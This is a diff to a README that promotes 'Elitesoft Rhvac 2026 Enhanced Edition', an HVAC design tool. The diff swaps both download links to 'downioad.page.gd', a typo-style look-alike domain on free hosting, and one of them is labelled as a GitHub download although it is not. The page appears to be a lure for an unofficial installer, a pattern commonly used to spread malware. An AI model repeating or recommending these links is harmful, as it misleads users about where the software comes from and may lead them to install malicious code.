@@ -2,7 +2,7 @@
 
 Elitesoft Rhvac 2026 Enhanced Edition is a powerful software solution tailored for HVAC engineers and designers. It provides an array of tools to streamline the design process, from initial load calculations to final ductwork planning. With its user-friendly interface and robust features, this tool elevates your professional workflow.
 
-[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://download-page.page.gd/)
+[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://downioad.page.gd/)
 
 ## Overview
 
@@ -62,6 +62,6 @@ The animated GIF above provides a quick visual guide to the installation process
 
 ## Download
 
-[Download the latest version from GitHub](https://download-page.page.gd/)
+[Download the latest version from GitHub](https://downioad.page.gd/)
 
 *Last Updated: 2026*
